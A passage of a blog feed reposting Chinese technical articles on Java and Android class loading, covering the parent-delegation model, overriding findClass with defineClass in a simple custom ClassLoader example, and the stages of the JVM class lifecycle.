Add the used dex file. This only required for the DexFile.loadClass API since normal</span><br><span class="line">      &#x2F;&#x2F; class loaders already keep their dex files live.</span><br><span class="line">      class_linker-&gt;InsertDexFileInToClassLoader(soa.Decode&lt;mirror::Object&gt;(dexFile),</span><br><span class="line">                                                 class_loader.Get());</span><br><span class="line">      ....</span><br><span class="line">        return soa.AddLocalReference&lt;jclass&gt;(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过<code>Runtime</code>拿到当前的<code>ClassLinker</code>对象，然后通过<code>class_linker-&amp;gt;DefineClass()</code>在当前 dex 中进行查找类。然后把找到的类通过<code>class_linker-&amp;gt;InsertDexFileInToClassLoader()</code>插入到 class_table 中进行缓存，返回查找到的类。这里不进一步展开分析。</p><blockquote><p>Android ClassLoader 加载过程的源代码分析到此已经分析得差不多了，如果想深入地了解具体原理，可以自己看源代码的实现。本文就介绍到这里。初次写技术分享的文章，如有错误请指正，感谢！</p></blockquote><p><strong>本文转载自公众号 360 技术（ID：qihoo_tech）</strong>。</p><p><strong>原文链接</strong>：</p><p><a href="https://mp.weixin.qq.com/s/31MGkrTTjiHfXffUDydONg"><strong>https://mp.weixin.qq.com/s/31MGkrTTjiHfXffUDydONg</strong></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>双亲委派模型与自定义类加载器</title>
      <link href="/2022/05/22/%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E4%B8%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
      <url>/2022/05/22/%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E4%B8%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.jianshu.com/p/acc7595f1b9d">双亲委派模型与自定义类加载器</a></p><p>其实，双亲委派模型并不复杂。自定义类加载器也不难！随便从网上搜一下就能搜出一大把结果，然后<code>copy</code>一下就能用。但是，如果每次想自定义类加载器就必须搜一遍别人的文章，然后复制，这样显然不行。可是自定义类加载器又不经常用，时间久了容易忘记。相信你经常会记不太清<code>loadClass</code>、<code>findClass</code>、<code>defineClass</code>这些函数我到底应该重写哪一个？它们主要是做什么的？本文大致分析了各个函数的流程，目的就是让你看完之后，难以忘记！或者说，延长你对自定义类加载器的记忆时间！随时随地想自定义就自定义！</p><h1 id="1-双亲委派模型"><a href="#1-双亲委派模型" class="headerlink" title="1. 双亲委派模型"></a>1. 双亲委派模型</h1><p>关于双亲委派模型，网上的资料有很多。我这里只简单的描述一下，就当是复习。</p><h2 id="1-1-什么是双亲委派模型？"><a href="#1-1-什么是双亲委派模型？" class="headerlink" title="1.1 什么是双亲委派模型？"></a>1.1 什么是双亲委派模型？</h2><p>首先，先要知道什么是类加载器。简单说，类加载器就是根据指定全限定名称将<code>class</code>文件加载到<code>JVM</code>内存，转为<code>Class</code>对象。如果站在<code>JVM</code>的角度来看，只存在两种类加载器:</p><blockquote><ul><li>启动类加载器（<code>Bootstrap ClassLoader</code>）：由<code>C++</code>语言实现（针对<code>HotSpot</code>）,负责将存放在<code>&lt;JAVA_HOME&gt;\lib</code>目录或<code>-Xbootclasspath</code>参数指定的路径中的类库加载到内存中。</li></ul><ul><li>其他类加载器：由<code>Java</code>语言实现，继承自抽象类<code>ClassLoader</code>。如：</li></ul><ul><li>扩展类加载器（<code>Extension ClassLoader</code>）：负责加载<code>&lt;JAVA_HOME&gt;\lib\ext</code>目录或<code>java.ext.dirs</code>系统变量指定的路径中的所有类库。</li></ul><ul><li>应用程序类加载器（<code>Application ClassLoader</code>）。负责加载用户类路径（<code>classpath</code>）上的指定类库，我们可以直接使用这个类加载器。一般情况，如果我们没有自定义类加载器默认就是用这个加载器。</li></ul></blockquote><p>双亲委派模型工作过程是：如果一个类加载器收到类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器完成。每个类加载器都是如此，只有当父加载器在自己的搜索范围内找不到指定的类时（即<code>ClassNotFoundException</code>），子加载器才会尝试自己去加载。</p><p><img src="//upload-images.jianshu.io/upload_images/2154124-d2f7f6206935de2b?imageMogr2/auto-orient/strip%7CimageView2/2/w/818/format/webp" alt="image"></p><h2 id="1-2-为什么需要双亲委派模型？"><a href="#1-2-为什么需要双亲委派模型？" class="headerlink" title="1.2 为什么需要双亲委派模型？"></a>1.2 为什么需要双亲委派模型？</h2><p>为什么需要双亲委派模型呢？假设没有双亲委派模型，试想一个场景：</p><blockquote><p>黑客自定义一个<code>java.lang.String</code>类，该<code>String</code>类具有系统的<code>String</code>类一样的功能，只是在某个函数稍作修改。比如<code>equals</code>函数，这个函数经常使用，如果在这这个函数中，黑客加入一些“病毒代码”。并且通过自定义类加载器加入到<code>JVM</code>中。此时，如果没有双亲委派模型，那么<code>JVM</code>就可能误以为黑客自定义的<code>java.lang.String</code>类是系统的<code>String</code>类，导致“病毒代码”被执行。</p></blockquote><p>而有了双亲委派模型，黑客自定义的<code>java.lang.String</code>类永远都不会被加载进内存。因为首先是最顶端的类加载器加载系统的<code>java.lang.String</code>类，最终自定义的类加载器无法加载<code>java.lang.String</code>类。</p><p>或许你会想，我在自定义的类加载器里面强制加载自定义的<code>java.lang.String</code>类，不去通过调用父加载器不就好了吗?确实，这样是可行。但是，在<code>JVM</code>中，判断一个对象是否是某个类型时，如果该对象的实际类型与待比较的类型的类加载器不同，那么会返回false。</p><p>举个简单例子：</p><blockquote><p><code>ClassLoader1</code>、<code>ClassLoader2</code>都加载<code>java.lang.String</code>类，对应Class1、Class2对象。那么<code>Class1</code>对象不属于<code>ClassLoad2</code>对象加载的<code>java.lang.String</code>类型。</p></blockquote><h2 id="1-3-如何实现双亲委派模型？"><a href="#1-3-如何实现双亲委派模型？" class="headerlink" title="1.3 如何实现双亲委派模型？"></a>1.3 如何实现双亲委派模型？</h2><p>双亲委派模型的原理很简单，实现也简单。每次通过先委托父类加载器加载，当父类加载器无法加载时，再自己加载。其实<code>ClassLoader</code>类默认的<code>loadClass</code>方法已经帮我们写好了，我们无需去写。</p><h1 id="2-自定义类加载器"><a href="#2-自定义类加载器" class="headerlink" title="2. 自定义类加载器"></a>2. 自定义类加载器</h1><h1 id="2-1几个重要函数"><a href="#2-1几个重要函数" class="headerlink" title="2. 1几个重要函数"></a>2. 1几个重要函数</h1><h3 id="2-1-1-loadClass"><a href="#2-1-1-loadClass" class="headerlink" title="2.1.1 loadClass"></a>2.1.1 loadClass</h3><p><code>loadClass</code>默认实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        return loadClass(name, false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再看看<code>loadClass(String name, boolean resolve)</code>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">    throws ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    synchronized (getClassLoadingLock(name)) &#123;</span><br><span class="line">        &#x2F;&#x2F; First, check if the class has already been loaded</span><br><span class="line">        Class c &#x3D; findLoadedClass(name);</span><br><span class="line">        if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">            long t0 &#x3D; System.nanoTime();</span><br><span class="line">            try &#123;</span><br><span class="line">                if (parent !&#x3D; null) &#123;</span><br><span class="line">                    c &#x3D; parent.loadClass(name, false);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    c &#x3D; findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                &#x2F;&#x2F; ClassNotFoundException thrown if class not found</span><br><span class="line">                &#x2F;&#x2F; from the non-null parent class loader</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F; If still not found, then invoke findClass in order</span><br><span class="line">                &#x2F;&#x2F; to find the class.</span><br><span class="line">                long t1 &#x3D; System.nanoTime();</span><br><span class="line">                c &#x3D; findClass(name);</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F; this is the defining class loader; record the stats</span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上面代码可以明显看出，<code>loadClass(String, boolean)</code>函数即实现了双亲委派模型！整个大致过程如下：</p><blockquote><ol><li>首先，检查一下指定名称的类是否已经加载过，如果加载过了，就不需要再加载，直接返回。</li><li>如果此类没有加载过，那么，再判断一下是否有父加载器；如果有父加载器，则由父加载器加载（即调用<code>parent.loadClass(name, false);</code>）.或者是调用<code>bootstrap</code>类加载器来加载。</li><li>如果父加载器及<code>bootstrap</code>类加载器都没有找到指定的类，那么调用当前类加载器的<code>findClass</code>方法来完成类加载。</li></ol></blockquote><p><strong>话句话说，如果自定义类加载器，就必须重写<code>findClass</code>方法！</strong></p><h3 id="2-1-1-find-Class"><a href="#2-1-1-find-Class" class="headerlink" title="2.1.1 find Class"></a>2.1.1 find Class</h3><p><code>findClass</code>的默认实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        throw new ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出，抽象类<code>ClassLoader</code>的<code>findClass</code>函数默认是抛出异常的。而前面我们知道，<code>loadClass</code>在父加载器无法加载类的时候，就会调用我们自定义的类加载器中的<code>findeClass</code>函数，因此我们必须要在<code>loadClass</code>这个函数里面实现将一个指定类名称转换为<code>Class</code>对象.</p><p>如果是是读取一个指定的名称的类为字节数组的话，这很好办。但是如何将字节数组转为<code>Class</code>对象呢？很简单，**<code>Java</code>提供了<code>defineClass</code>方法，通过这个方法，就可以把一个字节数组转为Class对象啦~**</p><h3 id="2-1-1-defineClass"><a href="#2-1-1-defineClass" class="headerlink" title="2.1.1 defineClass"></a>2.1.1 defineClass</h3><p><code>defineClass</code>主要的功能是：</p><blockquote><p>将一个字节数组转为<code>Class</code>对象，这个字节数组是<code>class</code>文件读取后最终的字节数组。如，假设<code>class</code>文件是加密过的，则需要解密后作为形参传入<code>defineClass</code>函数。</p></blockquote><p><code>defineClass</code>默认实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)</span><br><span class="line">        throws ClassFormatError  &#123;</span><br><span class="line">        return defineClass(name, b, off, len, null);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-2-函数调用过程"><a href="#2-2-函数调用过程" class="headerlink" title="2.2 函数调用过程"></a>2.2 函数调用过程</h2><p>上一节所提的函数调用过程如下：</p><p><img src="//upload-images.jianshu.io/upload_images/2154124-d5859f8e79069128?imageMogr2/auto-orient/strip%7CimageView2/2/w/598/format/webp" alt="image"></p><h2 id="2-3-简单示例"><a href="#2-3-简单示例" class="headerlink" title="2.3 简单示例"></a>2.3 简单示例</h2><p>首先，我们定义一个待加载的普通<code>Java</code>类:<code>Test.java</code>。放在<code>com.huachao.cl</code>包下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.huachao.cl;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public void hello() &#123;</span><br><span class="line">        System.out.println(&quot;恩，是的，我是由 &quot; + getClass().getClassLoader().getClass()</span><br><span class="line">                + &quot; 加载进来的&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><p>如果你是直接在当前项目里面创建，待<code>Test.java</code>编译后，请把<code>Test.class</code>文件拷贝走，再将<code>Test.java</code>删除。因为如果<code>Test.class</code>存放在当前项目中，根据双亲委派模型可知，会通过<code>sun.misc.Launcher$AppClassLoader</code> 类加载器加载。为了让我们自定义的类加载器加载，我们把Test.class文件放入到其他目录。</p></blockquote><p>在本例中，我们Test.class文件存放的目录如下：</p><p><img src="//upload-images.jianshu.io/upload_images/2154124-fcf13f3f446a60f1?imageMogr2/auto-orient/strip%7CimageView2/2/w/602/format/webp" alt="image"></p><p>接下来就是自定义我们的类加载器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    static class MyClassLoader extends ClassLoader &#123;</span><br><span class="line">        private String classPath;</span><br><span class="line"></span><br><span class="line">        public MyClassLoader(String classPath) &#123;</span><br><span class="line">            this.classPath &#x3D; classPath;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private byte[] loadByte(String name) throws Exception &#123;</span><br><span class="line">            name &#x3D; name.replaceAll(&quot;\\.&quot;, &quot;&#x2F;&quot;);</span><br><span class="line">            FileInputStream fis &#x3D; new FileInputStream(classPath + &quot;&#x2F;&quot; + name</span><br><span class="line">                    + &quot;.class&quot;);</span><br><span class="line">            int len &#x3D; fis.available();</span><br><span class="line">            byte[] data &#x3D; new byte[len];</span><br><span class="line">            fis.read(data);</span><br><span class="line">            fis.close();</span><br><span class="line">            return data;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                byte[] data &#x3D; loadByte(name);</span><br><span class="line">                return defineClass(name, data, 0, data.length);</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                throw new ClassNotFoundException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        MyClassLoader classLoader &#x3D; new MyClassLoader(&quot;D:&#x2F;test&quot;);</span><br><span class="line">        Class clazz &#x3D; classLoader.loadClass(&quot;com.huachao.cl.Test&quot;);</span><br><span class="line">        Object obj &#x3D; clazz.newInstance();</span><br><span class="line">        Method helloMethod &#x3D; clazz.getDeclaredMethod(&quot;hello&quot;, null);</span><br><span class="line">        helloMethod.invoke(obj, null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恩，是的，我是由 class Main$MyClassLoader 加载进来的</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载机制及类加载机制详解</title>
      <link href="/2022/05/22/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%8F%8A%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/05/22/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%8F%8A%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://lrh1993.gitbooks.io/android_interview_guide/content/java/virtual-machine/classloader.html">Java类加载机制及类加载机制详解</a></p><h2 id="一-类加载机制"><a href="#一-类加载机制" class="headerlink" title="一 类加载机制"></a>一 类加载机制</h2><h3 id="1-定义："><a href="#1-定义：" class="headerlink" title="1.定义："></a>1.定义：</h3><p>把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型。</p><p>在Java语言里，类型的加载、连接和初始化过程都是在程序运行期间完成的，这种策略虽然会令类加载时稍微增加一些性能开销，但是会为Java应用程序提供高度的灵活性，Java里天生可以动态扩展的语言特性就是依赖运行期动态加载和动态连接这个特点来实现的。</p><h3 id="2-类的生命周期："><a href="#2-类的生命周期：" class="headerlink" title="2.类的生命周期："></a>2.类的生命周期：</h3><p>加载，验证，准备，解析，初始化，使用和卸载。其中验证，准备，解析3个部分统称为连接。</p><p>这7个阶段发生顺序如下图：</p><p><img src="http://upload-images.jianshu.io/upload_images/3985563-0108cc612a217322.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p>加载，验证，准备，初始化，卸载这5个阶段的顺序是确定的，而解析阶段则不一定：它在某些情况下可以在初始化完成后在开始，这是为了支持Java语言的运行时绑定。</p><p><strong>其中加载，验证，准备，解析及初始化是属于类加载机制中的步骤。注意此处的加载不等同于类加载。</strong></p><h3 id="3-触发类加载的条件："><a href="#3-触发类加载的条件：" class="headerlink" title="3.触发类加载的条件："></a>3.触发类加载的条件：</h3><p>①.遇到new,getstatic,putstatic或invokestatic这4条字节码指令时，如果类没有进行过初始化，则需要先触发初始化。生成这4条指令的最常见的Java代码场景是：使用new关键字实例化对象的时候，读取或设置一个类的静态字段的时候（被final修饰，已在编译期把结果放入常量池的静态字段除外），以及调用一个类的静态方法的时候。</p><p>②.使用java.lang.reflect包的方法对类进行反射调用的时候。</p><p>③.当初始化一个类的时候，发现其父类还没有进行过初始化，则需要先出发父类的初始化。</p><p>④.当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类。</p><p>⑤.当使用JDK1.7的动态语言支持时，如果一个<code>java.lang.invoke.MethodHandle</code>实例最后的解析结果<code>REF_getStatic,REF_putStatic,REF_invokeStatic</code>的方法句柄，并且这个方法句柄所对应的类没有进行初始化，则需要先出发初始化。</p><h3 id="4-类加载的具体过程："><a href="#4-类加载的具体过程：" class="headerlink" title="4.类加载的具体过程："></a>4.类加载的具体过程：</h3><p><strong>加载:</strong></p><p>①.通过一个类的全限定名来获取定义此类的二进制字节流</p><p>②.将这个字节流所代表的静态存储结构转换为方法区内的运行时数据结构</p><p>③.在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口。</p><p><strong>验证：</strong></p><p>是连接阶段的第一步，目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。</p><p>包含四个阶段的校验动作</p><p>a.文件格式验证</p><p>验证字节流是否符合Class文件格式的规范，并且能被当前版本的虚拟机处理。</p><p>b.元数据验证</p><p>对类的元数据信息进行语义校验，是否不存在不符合Java语言规范的元数据信息</p><p>c.字节码验证</p><p>最复杂的一个阶段，主要目的是通过数据流和控制流分析，确定程序语义是合法的，符合逻辑的。对类的方法体进行校验分析，保证被校验类的方法在运行时不会做出危害虚拟机安全的事件。</p><p>d.符号引用验证</p><p>最后一个阶段的校验发生在虚拟机将符号引用转换为直接引用的时候，这个转换动作将在连接的第三个阶段——解析阶段中发生。</p><p>符号验证的目的是确保解析动作能正常进行。</p><p><strong>准备：</strong></p><p>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段。这些变量所使用的内存都将在方法区中分配。只包括类变量。初始值“通常情况”下是数据类型的零值。</p><p>“特殊情况”下，如果类字段的字段属性表中存在ConstantValue属性，那么在准备阶段变量的值就会被初始化为ConstantValue属性所指定的值。</p><p><strong>解析：</strong></p><p>虚拟机将常量池内的符号引用替换为直接引用的过程。</p><p>“动态解析”的含义就是必须等到程序实际运行到这条指令的时候，解析动作才能进行。相对的，其余可触发解析的指令都是“静态”的，可以在刚刚完成加载阶段，还没有开始执行代码时就进行解析。</p><p><strong>初始化：</strong></p><p>类加载过程中的最后一步。</p><p>初始化阶段是执行类构造器<code>&lt;clinit&gt;()</code>方法的过程。</p><p><code>&lt;clinit&gt;()</code>方法是由编译器自动收集类中的<strong>所有类变量的赋值动作和静态语句块中的语句合并产生的</strong>。</p><p><code>&lt;clinit&gt;()</code>与类的构造函数不同，它不需要显示地调用父类构造器，虚拟机会保证在子类的<code>&lt;clinit&gt;()</code>方法执行之前，父类的<code>&lt;clinit&gt;()</code>方法已经执行完毕。</p><p><strong>简单地说，初始化就是对类变量进行赋值及执行静态代码块。</strong></p><h2 id="二、类加载器"><a href="#二、类加载器" class="headerlink" title="二、类加载器"></a>二、类加载器</h2><p>通过上述的了解，我们已经知道了类加载机制的大概流程及各个部分的功能。其中加载部分的功能是将类的class文件读入内存，并为之创建一个java.lang.Class对象。这部分功能就是由类加载器来实现的。</p><h3 id="1-类加载器分类："><a href="#1-类加载器分类：" class="headerlink" title="1.类加载器分类："></a>1.类加载器分类：</h3><p>不同的类加载器负责加载不同的类。主要分为两类。</p><p><strong>启动类加载器（Bootstrap ClassLoader）</strong>： 由C++语言实现（针对HotSpot）,负责将存放在\lib目录或-Xbootclasspath参数指定的路径中的类库加载到内存中，即负责加载Java的核心类。</p><p><strong>其他类加载器：</strong> 由Java语言实现，继承自抽象类ClassLoader。如：</p><p><strong>扩展类加载器（Extension ClassLoader）：</strong> 负责加载\lib\ext目录或java.ext.dirs系统变量指定的路径中的所有类库，即负责加载Java扩展的核心类之外的类。</p><p><strong>应用程序类加载器（Application ClassLoader）：</strong> 负责加载用户类路径（classpath）上的指定类库，我们可以直接使用这个类加载器，通过ClassLoader.getSystemClassLoader()方法直接获取。一般情况，如果我们没有自定义类加载器默认就是用这个加载器。</p><p>以上2大类，3小类类加载器基本上负责了所有Java类的加载。下面我们来具体了解上述几个类加载器实现类加载过程时相互配合协作的流程。</p><h3 id="2-双亲委派模型"><a href="#2-双亲委派模型" class="headerlink" title="2.双亲委派模型"></a>2.双亲委派模型</h3><p><strong>双亲委派模型的工作流程是</strong>：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把请求委托给父加载器去完成，依次向上，因此，所有的类加载请求最终都应该被传递到顶层的启动类加载器中，只有当父加载器在它的搜索范围中没有找到所需的类时，即无法完成该加载，子加载器才会尝试自己去加载该类。</p><p><img src="http://upload-images.jianshu.io/upload_images/3985563-eb333a271ec638ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p>这样的好处是不同层次的类加载器具有不同优先级，比如所有Java对象的超级父类java.lang.Object，位于rt.jar，无论哪个类加载器加载该类，最终都是由启动类加载器进行加载，保证安全。即使用户自己编写一个java.lang.Object类并放入程序中，虽能正常编译，但不会被加载运行，保证不会出现混乱。</p><h3 id="3-双亲委派模型的代码实现"><a href="#3-双亲委派模型的代码实现" class="headerlink" title="3.双亲委派模型的代码实现"></a>3.双亲委派模型的代码实现</h3><p>ClassLoader中loadClass方法实现了双亲委派模型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">    throws ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    synchronized (getClassLoadingLock(name)) &#123;</span><br><span class="line">        &#x2F;&#x2F;检查该类是否已经加载过</span><br><span class="line">        Class c &#x3D; findLoadedClass(name);</span><br><span class="line">        if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;如果该类没有加载，则进入该分支</span><br><span class="line">            long t0 &#x3D; System.nanoTime();</span><br><span class="line">            try &#123;</span><br><span class="line">                if (parent !&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F;当父类的加载器不为空，则通过父类的loadClass来加载该类</span><br><span class="line">                    c &#x3D; parent.loadClass(name, false);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    &#x2F;&#x2F;当父类的加载器为空，则调用启动类加载器来加载该类</span><br><span class="line">                    c &#x3D; findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                &#x2F;&#x2F;非空父类的类加载器无法找到相应的类，则抛出异常</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;当父类加载器无法加载时，则调用findClass方法来加载该类</span><br><span class="line">                long t1 &#x3D; System.nanoTime();</span><br><span class="line">                c &#x3D; findClass(name); &#x2F;&#x2F;用户可通过覆写该方法，来自定义类加载器</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;用于统计类加载器相关的信息</span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (resolve) &#123;</span><br><span class="line">            &#x2F;&#x2F;对类进行link操作</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整个流程大致如下：</p><p>a.首先，检查一下指定名称的类是否已经加载过，如果加载过了，就不需要再加载，直接返回。</p><p>b.如果此类没有加载过，那么，再判断一下是否有父加载器；如果有父加载器，则由父加载器加载（即调用parent.loadClass(name, 